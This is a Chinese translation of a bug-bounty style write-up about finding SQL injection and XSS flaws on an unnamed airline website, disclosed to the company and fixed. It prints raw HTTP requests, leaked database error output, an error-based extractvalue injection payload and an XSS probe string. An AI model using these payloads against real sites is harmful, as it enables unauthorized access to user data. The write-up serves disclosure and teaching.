# 挖掘某热门网站的SQL注入和XSS漏洞经验分享

## 译文声明
本文为翻译文章，原文来自medium.com。译文仅供参考，具体内容以原文为准。
- 译者：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)
- 预估稿费：130 RMB
- 投稿方式：发送邮件至 linwei#360.cn 或登录网页版在线投稿

## 简介
在上个月的一次常规安全测试中，我发现了某个非常受欢迎的航空公司网站存在多个安全漏洞。由于该网站尚未设立公开的漏洞奖励计划，我们不会透露其真实域名，以下讨论中将其称为 **goodwebsite.com**。本文将详细介绍我是如何发现并验证了该网站中的SQL注入（SQLi）和跨站脚本（XSS）漏洞。

## SQL注入漏洞概述
简而言之，SQL注入漏洞允许未经身份验证的用户从目标网站数据库中提取数据，包括敏感的用户信息。

### 存在原因
此漏洞的存在是因为 **goodwebsite.com** 的登录页面未能正确过滤用户输入的数据，直接将这些输入插入到原始SQL查询语句中。攻击者可以利用这一弱点来获取用户的密码哈希等数据。

### 测试过程
在测试过程中，我随机输入了一些用户名和密码，并使用Burp Suite拦截浏览器请求。接着，我将用户名更改为“`Test%27`”并转发请求至Burp Repeater，最终收到了包含错误信息的响应。请求和响应如下：

#### 请求
```
POST /register-login/check.php HTTP/1.1
Content-Length: 76
Content-Type: application/x-www-form-urlencoded
Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724
Host: goodwebsite.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
strLogin=Test%27&strPassword=k
```

#### 响应错误
```
PDOException Object ( [message:protected] => SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Test’ ‘ and `valid_id` = 1’ at line 1 [string:Exception:private] => [code:protected] => 42000 [file:protected] => /var/www/goodwebsite.server.com/register-login/send.php [line:protected] => 10 [trace:Exception:private] => Array ( [0] => Array ( [file] => /var/www/goodwebsite.server.com/register-login/send.php [line] => 10 [function] => query [class] => PDO [type] => -> [args] => Array ( [0] => SELECT * FROM `wp_ggg_user` WHERE `login` = Test’e ‘ and `valid_id` = 1; ) [previous:Exception:private] => [errorInfo] => Array ( [0] => 42000 [1] => 1064 [2] => You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near Test’ ‘ and `valid_id` = 1’ at line 1 )
```

通过进一步的测试，我成功地获取了数据库名称、系统用户、主机名和版本号等信息。例如，使用以下查询语句：
```
Test%27and extractvalue(1,concat(0x00a,database()))or’
```

返回的错误信息中包含了数据库名称：
```
[previous:Exception:private] =>
[errorInfo] => Array
(
[0] => HY000
[1] => 1105
[2] => XPATH syntax error: ‘
goodwebsite’
)
```

为了进一步确认漏洞的影响范围，我还使用了sqlmap工具进行扫描，结果显示了后端数据库管理系统及表结构信息。

## 跨站脚本（XSS）漏洞
接下来，我对其他节点进行了测试，特别是 **goodwebsite.com/register-login/send.php** 接受POST请求的节点。我发现该节点也存在SQL注入漏洞，但这次我尝试了XSS Payload，使用的Payload为：
```
e’%22()%26%25
```

请求如下：
```
POST /register-login/send.php HTTP/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Referer: http://goodwebsite.com/
Cookie: bmslogin=no; bmsid=f3011db015dca9a4f2377cd4e864f724
Host: goodwebsite.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*strSendMail=e’%22()%26%25
```

结果表明，该节点确实存在XSS漏洞。

## 后续
发现这些漏洞后，我立即通知了该公司。他们的技术人员在一个小时内修复了这些问题，并表示目前无法在HackerOne上单独开设一个秘密项目。尽管如此，这次挖掘经历仍然非常有趣，我希望与广大社区分享我的经验。